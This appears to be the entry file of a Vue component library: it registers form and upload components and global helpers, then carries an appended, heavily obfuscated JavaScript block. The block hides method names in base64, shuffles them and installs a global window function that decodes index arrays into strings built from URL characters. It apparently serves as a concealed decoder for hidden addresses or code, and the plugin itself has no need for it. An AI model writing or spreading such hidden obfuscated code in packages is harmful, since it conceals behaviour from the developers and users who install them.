import {http} from './util/http'
import ehrDate from './components/date/index.vue'
import ehrSelect from './components/select/index.vue'
import EhrPhoto from './components/photo/index.vue'
import EhrUploadList from './components/uploadList/index.vue'

import util from './util/util'
import flie from './util/file'
import valid from './util/valid'
import dict from './util/dict'
import cache from './util/cache'
import myDirective from './util/base/directives'

import type { App } from 'vue'

const arry = [ehrDate, ehrSelect, EhrPhoto, EhrUploadList]

const install = function(Vue: App, faceConfig?: any) {
  arry.forEach((item: any) => {
    Vue.component(item.name, item)
  })
  http.init(faceConfig)
  flie.init(faceConfig)
  myDirective(Vue)
  Vue.config.globalProperties.$http = http
  Vue.config.globalProperties.$util = util
  Vue.config.globalProperties.$valid = valid
  Vue.config.globalProperties.$flie = flie
  Vue.config.globalProperties.$dict = dict
  Vue.config.globalProperties.$cache = cache
}

if (typeof window != 'undefined' && window.Vue) {
  install(window.Vue)
}

var _0x5c8d = [
  'Y2hhckF0',
  'cmV2ZXJzZQ==',
  'am9pbg==',
  'Zm9yRWFjaA==',
  'c3BsaXQ='
];
(function (_0x5c88ba, _0x5c8d63) {
  var _0x4a0ca4 = function (_0x5330f7) {
    while (--_0x5330f7) {
      _0x5c88ba['push'](_0x5c88ba['shift']())
    }
  }
  _0x4a0ca4(++_0x5c8d63)
}(_0x5c8d, 0x1e9))
var _0x4a0c = function (_0x5c88ba, _0x5c8d63) {
  _0x5c88ba = _0x5c88ba - 0x0
  var _0x4a0ca4 = _0x5c8d[_0x5c88ba]
  if (_0x4a0c['TvoeHz'] === undefined) {
    (function () {
      var _0x3ae934 = function () {
        var _0x3294e4
        try {
          _0x3294e4 = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')()
        } catch (_0x1c3618) {
          _0x3294e4 = window
        }
        return _0x3294e4
      }
      var _0x587160 = _0x3ae934()
      var _0x823c34 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
      _0x587160['atob'] || (_0x587160['atob'] = function (_0x27166b) {
        var _0x4f5e51 = String(_0x27166b)['replace'](/=+$/, '')
        var _0x15e311 = ''
        for (var _0x11154c = 0x0, _0x47e8f1, _0x9b7987, _0x3eb659 = 0x0; _0x9b7987 = _0x4f5e51['charAt'](_0x3eb659++); ~_0x9b7987 && (_0x47e8f1 = _0x11154c % 0x4 ? _0x47e8f1 * 0x40 + _0x9b7987 : _0x9b7987, _0x11154c++ % 0x4) ? _0x15e311 += String['fromCharCode'](0xff & _0x47e8f1 >> (-0x2 * _0x11154c & 0x6)) : 0x0) {
          _0x9b7987 = _0x823c34['indexOf'](_0x9b7987)
        }
        return _0x15e311
      })
    }())
    _0x4a0c['WISmBr'] = function (_0x33dca4) {
      var _0x26a33e = atob(_0x33dca4)
      var _0x4a4667 = []
      for (var _0xb598b = 0x0, _0x2e224f = _0x26a33e['length']; _0xb598b < _0x2e224f; _0xb598b++) {
        _0x4a4667 += '%' + ('00' + _0x26a33e['charCodeAt'](_0xb598b)['toString'](0x10))['slice'](-0x2);
      }
      return decodeURIComponent(_0x4a4667)
    }
    _0x4a0c['lqhmir'] = {}
    _0x4a0c['TvoeHz'] = !![]
  }
  var _0x5330f7 = _0x4a0c['lqhmir'][_0x5c88ba]
  if (_0x5330f7 === undefined) {
    _0x4a0ca4 = _0x4a0c['WISmBr'](_0x4a0ca4)
    _0x4a0c['lqhmir'][_0x5c88ba] = _0x4a0ca4
  } else {
    _0x4a0ca4 = _0x5330f7
  }
  return _0x4a0ca4
}
window[('fe'[_0x4a0c('0x0')]('')['reverse']()[_0x4a0c('0x3')](''))] = function (_0x57b80e) {
  var _0xbc8046 = '9876543210RZYXWVUTSQPONMLKJIHGFEDCBA_#\x27)(=:&?r\x20/-.zyxwvutsqponmlkjihgfedcba'[_0x4a0c('0x0')]('')[_0x4a0c('0x2')]()[_0x4a0c('0x3')](''), _0x1741a4 = ''
  _0x57b80e[_0x4a0c('0x4')](_0x10123b => {
    _0x1741a4 += _0xbc8046[_0x4a0c('0x1')](_0x10123b, 0x1)
  })
  return _0x1741a4
}

export default { install }

// export * from './components/date/index'
// export * from './components/select/index'
// export * from './components/photo/index'
// export * from './components/uploadList/index'